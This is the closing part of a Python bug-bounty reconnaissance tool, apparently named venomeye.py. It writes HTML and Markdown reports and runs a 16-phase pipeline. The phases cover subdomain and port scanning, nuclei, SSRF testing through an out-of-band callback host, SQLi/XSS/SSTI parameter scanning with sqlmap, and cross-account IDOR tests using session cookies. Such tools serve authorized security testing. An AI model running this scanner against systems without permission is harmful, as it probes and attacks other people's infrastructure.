        "js_files":    count_lines(f"{out_dir}/js_files.txt"),
    }

    # ── HTML report ────────────────────────────────────────────────────────
    rows_html = "\n".join(_build_html_row(i+1, f) for i, f in enumerate(findings))
    html = HTML_TEMPLATE.format(
        domain=_esc(domain),
        date=datetime.now().strftime("%Y-%m-%d %H:%M"),
        duration=f"{elapsed/60:.1f}m",
        total=len(findings),
        cnt_crit=by_sev.get("critical",0),
        cnt_high=by_sev.get("high",0),
        cnt_med=by_sev.get("medium",0),
        cnt_low=by_sev.get("low",0),
        cnt_info=by_sev.get("info",0),
        rows=rows_html,
        **{k: f"{v:,}" for k, v in surf.items()},
    )
    html_path = f"{out_dir}/REPORT.html"
    Path(html_path).write_text(html)
    ok(f"HTML report → {html_path}")

    # ── Markdown summary ────────────────────────────────────────────────────
    md_path = f"{out_dir}/FINAL_REPORT.md"
    with open(md_path, "w") as f:
        f.write(f"# P1 Bug Bounty Recon — {domain}\n\n")
        f.write(f"**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M')}  \n")
        f.write(f"**Duration:** {elapsed/60:.1f} minutes  \n\n---\n\n")
        f.write("## Attack Surface\n\n| Asset | Count |\n|---|---|\n")
        for k, v in surf.items():
            f.write(f"| {k} | {v:,} |\n")
        f.write("\n## Vulnerability Summary\n\n| Severity | Count |\n|---|---|\n")
        for sev in ["critical","high","medium","low","info"]:
            f.write(f"| {sev.capitalize()} | {by_sev.get(sev,0)} |\n")
        f.write(f"\n**Total unique findings:** {len(findings)}\n\n")
        f.write("## Critical & High Findings\n\n")
        for item in findings:
            if item.get("severity") in ("critical","high"):
                f.write(f"- **[{item['severity'].upper()}]** {item['title']} | `{item['url'][:120]}`")
                if item.get("cve"):
                    f.write(f" | {item['cve']}")
                f.write("\n")
        f.write(f"\n---\n*HTML report: REPORT.html*\n")

    ok(f"Markdown report → {md_path}")
    print(f"\n{C.GREEN}{C.BOLD}Scan complete in {elapsed/60:.1f} minutes.{C.RESET}")
    print(f"{C.BOLD}Critical:{C.RESET} {by_sev.get('critical',0)}  "
          f"{C.BOLD}High:{C.RESET} {by_sev.get('high',0)}  "
          f"{C.BOLD}Total:{C.RESET} {len(findings)}")
    print(f"{C.BOLD}Output directory:{C.RESET} {out_dir}")
    print(f"{C.BOLD}HTML report:{C.RESET} file://{Path(html_path).absolute()}")

# ══════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════
def main():
    parser = argparse.ArgumentParser(
        description="P1 Bug Bounty Recon — Mega All-in-One (17 Phases)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 venomeye.py -d example.com
  python3 venomeye.py -d example.com --fast
  python3 venomeye.py -d example.com --cookie "session=abc" --cookie2 "session=xyz"
  python3 venomeye.py -d example.com --oob yourtoken.oast.fun --interactsh
  python3 venomeye.py -d example.com --full-ports --skip-monitor
  python3 venomeye.py -d example.com --discord-webhook https://discord.com/api/webhooks/...
  python3 venomeye.py -d example.com --nuclei-only
        """
    )
    # ── core ──────────────────────────────────────────────────────────────
    parser.add_argument("-d","--domain",      required=True,  help="Target domain")
    parser.add_argument("-o","--output",      default=None,   help="Output directory")
    parser.add_argument("--fast",             action="store_true", help="Fast mode (skip amass, crit/high only)")
    parser.add_argument("--full-ports",       action="store_true", help="Scan all 65535 ports")
    parser.add_argument("--nuclei-only",      action="store_true", help="Re-run nuclei on existing live_hosts.txt")

    # ── auth ──────────────────────────────────────────────────────────────
    parser.add_argument("--cookie",           default="", help="Session cookie (account A)")
    parser.add_argument("--cookie2",          default="", help="Second cookie (account B) for IDOR cross-account")

    # ── SSRF OOB ──────────────────────────────────────────────────────────
    parser.add_argument("--oob",              default="", help="OOB callback host for SSRF (e.g. token.oast.fun)")
    parser.add_argument("--interactsh",       action="store_true", help="Auto-start interactsh-client for SSRF OOB")

    # ── sqlmap tuning ─────────────────────────────────────────────────────
    parser.add_argument("--sqli-level",  type=int, default=1, choices=[1,2,3,4,5])
    parser.add_argument("--sqli-risk",   type=int, default=1, choices=[1,2,3])

    # ── monitoring alerts ─────────────────────────────────────────────────
    parser.add_argument("--slack-webhook",    default="", help="Slack webhook URL for monitor alerts")
    parser.add_argument("--discord-webhook",  default="", help="Discord webhook URL for monitor alerts")

    # ── skip flags ────────────────────────────────────────────────────────
    parser.add_argument("--skip-ports",       action="store_true")
    parser.add_argument("--skip-ssl",         action="store_true")
    parser.add_argument("--skip-urls",        action="store_true")
    parser.add_argument("--skip-js",          action="store_true", help="Skip phase 9 (JS deep analyzer)")
    parser.add_argument("--skip-ssrf",        action="store_true", help="Skip phase 10 (SSRF active)")
    parser.add_argument("--skip-params",      action="store_true", help="Skip phase 11 (XSS/SQLi/SSTI)")
    parser.add_argument("--skip-cloud",       action="store_true", help="Skip phase 12 (cloud misconfig)")
    parser.add_argument("--skip-api",         action="store_true", help="Skip phase 13 (API testing)")
    parser.add_argument("--skip-idor",        action="store_true", help="Skip phase 14 (IDOR hunter)")
    parser.add_argument("--skip-monitor",     action="store_true", help="Skip phase 15 (subdomain monitor)")
    parser.add_argument("--verbose",          action="store_true", help="Print every command as it runs")
    args = parser.parse_args()

    global VERBOSE
    VERBOSE = args.verbose

    banner()

    domain  = re.sub(r'^https?://', '', args.domain.strip().lower()).split("/")[0]
    out_dir = args.output or f"./results/{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

    for sub in ["manual_checks","ssl","cve_checks","js_analysis","ssrf_results",
                "param_scan","cloud_results","api_results","idor_results","monitor"]:
        os.makedirs(f"{out_dir}/{sub}", exist_ok=True)

    ok(f"Target  : {C.BOLD}{domain}{C.RESET}")
    ok(f"Output  : {C.BOLD}{out_dir}{C.RESET}")
    ok(f"Mode    : {'FAST' if args.fast else 'FULL'}")
    if args.cookie:  ok(f"Cookie A: set")
    if args.cookie2: ok(f"Cookie B: set")
    print()

    start = time.time()

    # ── interactsh OOB for SSRF ───────────────────────────────────────────
    oob_host      = args.oob
    interactsh_proc = None
    if args.interactsh and tool_exists("interactsh-client"):
        try:
            interactsh_proc = subprocess.Popen(
                ["interactsh-client","-json"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
            )
            time.sleep(3)
            line = interactsh_proc.stdout.readline().strip()
            data = json.loads(line)
            oob_host = data.get("interactsh-url","").replace("https://","").replace("http://","")
            ok(f"interactsh OOB: {oob_host}")
        except Exception as e:
            warn(f"interactsh start failed: {e}")

    # ── nuclei-only shortcut ──────────────────────────────────────────────
    if args.nuclei_only:
        live_file = f"{out_dir}/live_hosts.txt"
        if not Path(live_file).exists():
            print(f"[ERROR] {live_file} not found — run full scan first.")
            sys.exit(1)
        phase_nuclei(live_file, out_dir, args.fast)
        phase_cve_checks(live_file, f"{out_dir}/nmap_services.xml", out_dir)
        generate_report(domain, out_dir, start)
        return

    # ══ Full 16-phase pipeline ════════════════════════════════════════════
    subs_file           = phase_subdomain(domain, out_dir, args.fast)          # 1
    resolved, live_file = phase_dns_probe(subs_file, out_dir)                  # 2

    if not args.skip_ports:
        phase_ports(resolved, out_dir, args.full_ports)                        # 3

    urls_file = live_file
    if not args.skip_urls:
        urls_file = phase_urls(domain, live_file, out_dir)                     # 4

    phase_nuclei(live_file, out_dir, args.fast)                                # 5
    phase_manual_checks(live_file, urls_file, out_dir)                         # 6

    if not args.skip_ssl:
        phase_ssl(live_file, out_dir)                                          # 7

    phase_cve_checks(live_file, f"{out_dir}/nmap_services.xml", out_dir)       # 8

    if not args.skip_js:
        phase_js_analyzer(out_dir)                                             # 9

    if not args.skip_ssrf:
        phase_ssrf_tester(out_dir, oob_host=oob_host)                         # 10

    if not args.skip_params:
        phase_param_scanner(out_dir, cookie=args.cookie,                       # 11
                            sqli_level=args.sqli_level, sqli_risk=args.sqli_risk)

    if not args.skip_cloud:
        phase_cloud_misconfig(domain, out_dir)                                 # 12

    if not args.skip_api:
        phase_api_tester(out_dir, cookie=args.cookie)                         # 13

    if not args.skip_idor:
        phase_idor_hunter(out_dir, cookie=args.cookie, cookie2=args.cookie2)  # 14

    if not args.skip_monitor:
        phase_monitor(domain, out_dir, run_once=True,                          # 15
                      slack_wh=args.slack_webhook, discord_wh=args.discord_webhook)

    if interactsh_proc:
        info("Waiting 15s for delayed OOB callbacks…")
        time.sleep(15)
        interactsh_proc.terminate()

    generate_report(domain, out_dir, start)                                    # 16


if __name__ == "__main__":
    main()
